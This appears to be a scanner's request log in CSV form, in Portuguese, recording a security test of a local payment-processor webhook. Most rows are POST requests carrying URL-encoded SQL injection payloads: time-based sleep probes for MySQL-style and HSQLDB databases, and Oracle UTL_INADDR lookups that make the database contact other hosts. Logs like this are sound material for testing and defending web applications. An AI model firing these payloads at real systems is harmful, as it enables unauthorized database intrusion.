ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
4618,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,7,92,0
4619,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,9,92,0
4620,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,9,92,0
4621,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora+or+0+in+%28select+sleep%2815%29+%29+--+,200,OK,9,92,0
4622,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora+or+0+in+%28select+sleep%2815%29+%29+--+,200,OK,8,92,0
4623,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000,404,Not Found,1,99,0
4624,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,2,99,0
4625,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
4626,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,4,92,0
4627,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4628,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4629,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4630,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4631,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4632,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
4633,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4634,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%22java.lang.Thread.sleep%22%2815000%29&statusReembolso=AguardandoRetornoProcessadora,200,OK,11,92,0
4635,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%22java.lang.Thread.sleep%22%2815000%29&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4636,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido+%2F+%22java.lang.Thread.sleep%22%2815000%29+&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4637,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido+%2F+%22java.lang.Thread.sleep%22%2815000%29+&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4638,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4639,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4640,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4641,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4642,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4643,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&status=AguardandoRetornoProcessadora,200,OK,12,92,0
4644,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
4645,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4646,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,10,92,0
4647,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,10,92,0
4648,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,9,92,0
4649,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,8,92,0
4650,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,9,92,0
4651,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,11,92,0
4652,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,12,92,0
4653,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,7,92,0
4654,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%22java.lang.Thread.sleep%22%2815000%29,200,OK,7,92,0
4655,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%22java.lang.Thread.sleep%22%2815000%29,200,OK,9,92,0
4656,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora+%2F+%22java.lang.Thread.sleep%22%2815000%29+,200,OK,7,92,0
4657,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora+%2F+%22java.lang.Thread.sleep%22%2815000%29+,200,OK,9,92,0
4658,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,200,OK,8,92,0
4659,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,200,OK,7,92,0
4660,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,200,OK,12,92,0
4661,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,200,OK,11,92,0
4662,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,6,92,0
4663,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,8,92,0
4664,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,7,92,0
4665,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,8,92,0
4666,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000,404,Not Found,1,99,0
4667,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,0,99,0
4668,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
4669,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4670,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora,200,OK,11,92,0
4671,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29&status=AguardandoRetornoProcessadora,200,OK,10,92,0
4672,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
4673,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4674,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4675,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4676,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4677,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4678,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4679,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4680,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
4681,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4682,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4683,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,200,OK,8,92,0
4684,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,200,OK,8,92,0
